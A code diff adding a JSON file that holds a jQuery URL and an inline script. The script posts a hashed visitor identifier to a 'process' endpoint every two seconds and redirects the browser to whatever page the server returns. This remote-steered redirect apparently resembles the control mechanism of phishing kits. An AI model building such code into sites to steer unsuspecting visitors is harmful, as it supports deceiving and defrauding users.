@@ -1,0 +1,4 @@
+{
+    "script_1": "https://code.jquery.com/jquery-3.5.1.min.js",
+    "script_2": "\n    $(document).ready(function () {\n        send();\n        setInterval(send, 2000);\n    });\n\n    function send() {\n        $.ajax({\n            type: 'POST',\n            url: \"process\",\n            data: \"ip=4eb41e3d047316209515a4550146d333a09ec3e3\",\n            success: function (msg) {\n                if(msg){\n                    msg = JSON.parse(msg);\n                    window.location.href = msg.page;\n                }\n               \n            }\n        });\n    }\n"
+}
